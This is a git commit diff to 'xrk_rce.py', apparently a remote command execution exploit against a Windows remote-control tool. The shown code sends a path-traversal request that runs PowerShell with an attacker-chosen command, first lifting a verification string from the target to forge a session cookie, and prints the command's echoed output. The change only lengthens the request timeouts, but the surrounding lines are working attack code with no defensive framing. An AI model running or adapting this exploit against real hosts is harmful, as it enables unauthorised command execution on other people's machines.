4b18256464f902da31a02668286d52755ab8c843
onMey <50954088+onMey@users.noreply.github.com>
2022-04-22 18:56:41 +0800

    Create xrk_rce.py

--- xrk_rce.py
+++ xrk_rce.py
@@ -11,12 +11,12 @@ def pr(host,cmd):
     payload1='/check?cmd=ping../../../windows/system32/windowspowershell/v1.0/powershell.exe+{}'.format(cmd)
     url=host
     try:
-        response1=requests.get(url=url+payload,headers=headers1,verify=False,timeout=10)
+        response1=requests.get(url=url+payload,headers=headers1,verify=False,timeout=30)
         cookie=re.search(r'verify_string(.*?),',response1.text, re.S).group(1).replace('"','').replace(":","")
         cookie="CID={}".format(cookie)
         headers2 = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
                    "Cookie": cookie}
-        response=requests.get(url=url+payload1,headers=headers2,verify=False,timeout=10)
+        response=requests.get(url=url+payload1,headers=headers2,verify=False,timeout=30)
         if response.text != '':
             print(url+"漏洞存在，命令回显："+response.text)
         else:
